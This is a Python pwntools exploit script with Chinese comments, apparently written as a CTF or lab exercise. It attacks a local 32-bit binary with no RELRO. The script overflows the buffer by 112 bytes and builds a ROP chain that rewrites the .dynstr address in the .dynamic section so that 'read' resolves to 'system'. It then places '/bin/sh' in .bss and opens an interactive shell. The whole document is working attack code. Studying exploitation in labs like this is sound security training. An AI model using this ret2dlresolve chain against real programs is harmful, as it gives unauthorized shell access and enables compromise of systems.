from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="i386"

p = process("./main_no_relro_32")
rop = ROP("./main_no_relro_32") # 获取目标二进制文件中可利用的gadgets，构造ROP攻击链
elf = ELF("./main_no_relro_32") # 读取待攻击的二进制文件的内容，主要是为了获取dynstr节的内容

offset = 112 # 溢出112字节后开始覆盖返回地址
rop.raw(offset * b'a') # 溢出至返回地址
rop.read(0,0x08049804+4,4) # dynamic中存放的dynstr节地址信息的成员的地址
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.decode('utf-8')  # 将字节对象转换为字符串
dynstr = dynstr.replace("read", "system")
dynstr = dynstr.encode('utf-8')  # 如果需要字节对象，再转换回字节对象

rop.read(0,0x080498E0,len((dynstr)))
rop.read(0,0x080498E0+0x100,len(b"/bin/sh\x00")) # 将 /bin/sh 字符串写入到bss段, 从标准输入中获取字符串
rop.raw(0x08048376) # 重新跳转到首次调用read函数的流程，这次使用的是伪造的dynstr, 因此执行完延迟绑定后实际调用的函数为system
rop.raw(0xdeadbeef) # 填充字符串
rop.raw(0x080498E0+0x100) # system函数的参数，也就是 /bin/sh 字符串的地址

assert(len(rop.chain())<=256)
rop.raw(b"a"*(256-len(rop.chain())))
p.send(rop.chain())
p.send(p32(0x080498E0))
p.send(dynstr)
p.send(b"/bin/sh\x00")
p.interactive()
